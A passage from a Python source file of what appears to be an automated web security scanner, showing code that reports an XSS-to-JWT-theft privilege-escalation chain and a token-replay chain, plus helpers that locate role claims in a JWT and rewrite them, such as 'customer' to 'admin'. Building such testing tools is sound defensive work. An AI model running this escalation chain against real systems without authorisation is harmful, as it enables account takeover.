                    "attack_type": "xss_token_escalation_chain",
                    "chain_steps": [
                        "XSS exploitation",
                        "JWT theft from localStorage",
                        "JWT decode + role modification",
                        "JWT re-signing with cracked secret",
                        "Admin endpoint access",
                    ],
                    "xss_source": xss_url,
                    "cracked_secret": self._cracked_secret,
                },
            ).to_dict())
        else:
            # Partial chain: XSS + token replay (no role escalation)
            # Check if Test 1 proved token replay works
            has_replay = any(
                f.get("name", "").startswith("JWT Token Valid After Logout")
                for f in existing_findings
            )
            if has_replay:
                findings.append(Finding(
                    type="session_abuse",
                    name="XSS to Persistent Session Hijack Chain",
                    severity="HIGH",
                    description=(
                        f"Attack chain: "
                        f"1) XSS at {xss_url} allows JavaScript execution. "
                        f"2) JWT token accessible via localStorage. "
                        f"3) Stolen token remains valid indefinitely (no "
                        f"server-side invalidation). "
                        f"Impact: Attacker gains persistent access to victim's "
                        f"account, surviving even logout."
                    ),
                    host=base_url,
                    matched_at=xss_url,
                    evidence=[
                        f"XSS confirmed at: {xss_url}",
                        "Token storage: Bearer JWT (JS accessible)",
                        "Token replay: verified (no logout invalidation)",
                        "Chain: XSS → Token Theft → Persistent Replay",
                    ],
                    cvss_score=8.1,
                    cwe="CWE-79",
                    confidence=80,
                    remediation=(
                        "1. Fix XSS vulnerabilities. "
                        "2. Store tokens in HttpOnly cookies. "
                        "3. Implement token denylist for logout. "
                        "4. Use short-lived access tokens."
                    ),
                    metadata={
                        "module": "session_abuse",
                        "attack_type": "xss_token_replay_chain",
                        "xss_source": xss_url,
                    },
                ).to_dict())

        return findings

    # ------------------------------------------------------------------
    # Utility methods
    # ------------------------------------------------------------------

    def _find_role_claims(
        self, payload: dict[str, Any],
    ) -> list[tuple[str, Any]]:
        """Find role/privilege claims in JWT payload (generic)."""
        found: list[tuple[str, Any]] = []

        # Top-level claims
        for key in ROLE_CLAIM_NAMES:
            if key in payload:
                found.append((key, payload[key]))

        # Nested claims (data.role, user.role, claims.role, realm_access.roles, etc.)
        for nested_key in ("data", "user", "claims", "realm_access", "resource_access"):
            nested = payload.get(nested_key)
            if isinstance(nested, dict):
                for key in ROLE_CLAIM_NAMES:
                    if key in nested:
                        found.append((f"{nested_key}.{key}", nested[key]))

        return found


# ---------------------------------------------------------------------------
# Helper: deep set a nested value by dot-path in a dict
# ---------------------------------------------------------------------------

def _deep_set(d: dict, path: str, value: Any) -> dict:
    """Set a value at a dot-separated path in a nested dict.

    Example: _deep_set({"data": {"role": "customer"}}, "data.role", "admin")
    """
    keys = path.split(".")
    current = d
    for key in keys[:-1]:
        if key not in current or not isinstance(current[key], dict):
            current[key] = {}
        # Copy nested dicts to avoid mutating original
        current[key] = current[key].copy()
        current = current[key]
    current[keys[-1]] = value
    return d
